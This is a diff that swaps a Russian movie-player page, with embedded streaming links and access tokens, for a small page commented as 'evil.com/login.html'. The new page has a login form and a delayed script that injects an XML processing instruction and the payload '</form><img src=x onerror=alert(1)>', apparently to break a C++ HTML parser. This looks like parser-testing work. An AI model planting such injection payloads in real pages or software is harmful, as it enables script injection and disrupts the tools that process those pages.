@@ -1,83 +1,22 @@
+<!-- evil.com/login.html -->
 <!DOCTYPE html>
-<html lang="ru">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Player</title>
-  <style>
-*{box-sizing:border-box}html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;background:#2A3440;font-family:Arial,sans-serif}
-.wrapper{width:100%;height:100%;display:flex;flex-direction:column}
-.player-wrap{flex:1;position:relative;background:#000}
-.player-wrap iframe{width:100%;height:100%;border:0}
-.toolbar{background:#1a1f2b;padding:8px 12px;display:flex;flex-wrap:wrap;gap:6px;align-items:center}
-.toolbar .btn{background:#3a4556;color:#ccc;border:0;padding:6px 14px;border-radius:4px;cursor:pointer;font-size:13px;transition:.15s}
-.toolbar .btn:hover{background:#4a5568;color:#fff}
-.toolbar .btn.active{background:#5a7fb5;color:#fff}
-.toolbar .label{color:#888;font-size:12px;margin-right:4px}
-  </style>
-</head>
+<html>
+<head><title>Login</title></head>
 <body>
-<div class="wrapper">
-  <div class="player-wrap" id="playerWrap">
-    <iframe id="playerFrame" allowfullscreen allow="autoplay;fullscreen" src="about:blank"></iframe>
-  </div>
-  <div class="toolbar" id="toolbar"></div>
-</div>
-
+<form id="f">
+  <input name="user">
+  <input type="password" name="pass">
+</form>
 <script>
-const players = [{"type":"Alloha","iframeUrl":"https://theatre.stravers.live/?token_movie=79a807eb9627cfbb6d309ffa87a3db&token=45e20a5f584becf7a64dffb7174ddf","translations":[{"id":79,"name":"Субтитры","quality":"WEB-DL","iframeUrl":"https://theatre.stravers.live/?token_movie=79a807eb9627cfbb6d309ffa87a3db&translation=79&token=45e20a5f584becf7a64dffb7174ddf"},{"id":82,"name":"Не требуется","quality":"WEB-DL","iframeUrl":"https://theatre.stravers.live/?token_movie=79a807eb9627cfbb6d309ffa87a3db&translation=82&token=45e20a5f584becf7a64dffb7174ddf"}]},{"type":"Veoveo","iframeUrl":"https://player.temptcdn.com/balancer-api/iframe?movie_id=162203&token=eyJhbGciOiJIUzI1NiJ9.eyJ3ZWJTaXRlIjoiODk3Iiwic3ViIjoiOTA2Iiwic2NvcGUiOiJETEUiLCJpc3MiOiJhcGktd2VibWFzdGVyIiwiZXhwIjoxODEzMTUxMjcxLCJpYXQiOjE3ODE2MTUyNzEsImp0aSI6IjM0YjhkMmExLTAzM2ItNDNmNS05ZTM4LWEzYWYyMzg0OWU0NiJ9.YZ_-HSOiEy5XOu9Ef7IIegjL0NkxjFLgX7nGqWtqGS8","translations":[{"id":null,"name":"русский. Оригинал. оригинальный. AAC","quality":null,"iframeUrl":"https://player.temptcdn.com/balancer-api/iframe?movie_id=162203&token=eyJhbGciOiJIUzI1NiJ9.eyJ3ZWJTaXRlIjoiODk3Iiwic3ViIjoiOTA2Iiwic2NvcGUiOiJETEUiLCJpc3MiOiJhcGktd2VibWFzdGVyIiwiZXhwIjoxODEzMTUxMjcxLCJpYXQiOjE3ODE2MTUyNzEsImp0aSI6IjM0YjhkMmExLTAzM2ItNDNmNS05ZTM4LWEzYWYyMzg0OWU0NiJ9.YZ_-HSOiEy5XOu9Ef7IIegjL0NkxjFLgX7nGqWtqGS8"}]},{"type":"Collaps","iframeUrl":"https://api.ortified.ws/embed/movie/89982","translations":[{"id":null,"name":"Рус. Оригинальный","quality":"FHD (1080p)","iframeUrl":"https://api.ortified.ws/embed/movie/89982"},{"id":null,"name":"Рус. Ориг. (без цензуры)","quality":"FHD (1080p)","iframeUrl":"https://api.ortified.ws/embed/movie/89982"}]},{"type":"Turbo","iframeUrl":"https://3a41cf05.obrut.show/embed/kzM/content/zYDO0ETM","translations":[{"id":null,"name":null,"quality":null,"iframeUrl":"https://3a41cf05.obrut.show/embed/kzM/content/zYDO0ETM"}]}];
-
-const frame = document.getElementById('playerFrame');
-const toolbar = document.getElementById('toolbar');
-let activeSource = null;
-
-function loadPlayer(url) {
-  if (activeSource === url) return;
-  activeSource = url;
-  frame.src = url;
-}
-
-function buildUI() {
-  players.forEach((p, pi) => {
-    if (p.translations && p.translations.length > 0) {
-      const label = document.createElement('span');
-      label.className = 'label';
-      label.textContent = p.type + ':';
-      toolbar.appendChild(label);
-
-      p.translations.forEach((t, ti) => {
-        const btn = document.createElement('button');
-        btn.className = 'btn' + (pi === 0 && ti === 0 ? ' active' : '');
-        btn.textContent = t.name || t.quality || p.type;
-        btn.title = p.type + (t.quality ? ' - ' + t.quality : '');
-        btn.onclick = function() {
-          toolbar.querySelectorAll('.btn').forEach(b => b.classList.remove('active'));
-          btn.classList.add('active');
-          loadPlayer(t.iframeUrl);
-        };
-        toolbar.appendChild(btn);
-      });
-    } else {
-      const btn = document.createElement('button');
-      btn.className = 'btn' + (pi === 0 ? ' active' : '');
-      btn.textContent = p.type;
-      btn.onclick = function() {
-        toolbar.querySelectorAll('.btn').forEach(b => b.classList.remove('active'));
-        btn.classList.add('active');
-        loadPlayer(p.iframeUrl);
-      };
-      toolbar.appendChild(btn);
-    }
-  });
-
-  if (players[0] && players[0].translations && players[0].translations[0]) {
-    loadPlayer(players[0].translations[0].iframeUrl);
-  } else if (players[0]) {
-    loadPlayer(players[0].iframeUrl);
-  }
-}
-
-buildUI();
+setTimeout(() => {
+  // инжектируем в DOM то, что сломает C++ парсер
+  const pi = document.createProcessingInstruction("xml", "?>");
+  document.getElementById("f").appendChild(pi);
+  
+  const d = document.createElement("div");
+  d.innerHTML = '</form><img src=x onerror=alert(1)>';
+  document.getElementById("f").appendChild(d);
+}, 3000);
 </script>
 </body>
 </html>
